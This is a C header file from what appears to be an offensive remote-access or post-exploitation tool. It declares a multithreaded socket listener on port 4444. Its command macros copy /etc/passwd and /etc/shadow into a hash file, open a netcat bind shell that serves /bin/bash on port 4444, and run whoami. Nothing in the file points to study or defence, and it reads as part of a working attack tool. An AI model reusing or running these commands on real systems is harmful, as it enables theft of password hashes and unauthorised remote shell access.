/**
 * handler.h
 * 
 * Written By Josh Harshman
 * April 23, 2014
 * 
 * */

#ifndef HANDLER_H
#define HANDLER_H

#define PORT 4444
#define BACKLOG_SIZE 10

#define HASHDUMP "cat /etc/passwd > ~/hashes && cat /etc/shadow >> ~/hashes"
#define BACKDOOR "nc -l -p 4444 -e /bin/bash"
#define GETUID "whoami"
#define COMMAND4 ""

//----[include]----

#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "colors.h"

//----[end include]----


//----[prototypes]----

/*
 * void handler(int *onflag)
 * This method is a multithreading socket listener.  When a connection comes in, a pthread is dispatched to handle the connection
 * This method loops until it receives a signal from main to quit execution.  In which case it breaks the loop, cleans up, and
 * joins the main thread (if running as a dispatched thread).
 * @Param int *onflag:  A pointer to an integer flag.  Is set to 1 (ON) when handler starts looping.  Default 0 (OFF)
 * */
void *handler(void *tid);

void *process_connection(void *connfd);

int interact();

//----[end prototypes]----

#endif
